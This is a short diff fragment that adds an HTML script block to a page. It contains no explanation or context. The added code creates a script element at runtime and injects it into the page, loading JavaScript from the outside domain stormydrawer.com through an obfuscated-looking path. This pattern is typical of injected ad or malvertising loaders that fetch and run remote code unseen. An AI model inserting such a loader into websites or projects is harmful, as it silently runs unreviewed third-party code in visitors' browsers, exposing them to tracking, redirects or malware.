@@ -1,0 +1,10 @@
+<script>
+(function(ahta){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = ahta || {};
+s.src = "\/\/stormydrawer.com\/baX.VnsidjGTlB0tYDWicM\/-ekmO9vuQZqUglOkfPKTYQr2fNejOYh3mNED\/Aft\/NDDqYm2EN-jocG0\/MQQF";
+l.parentNode.insertBefore(s, l);
+})({})
+</script>
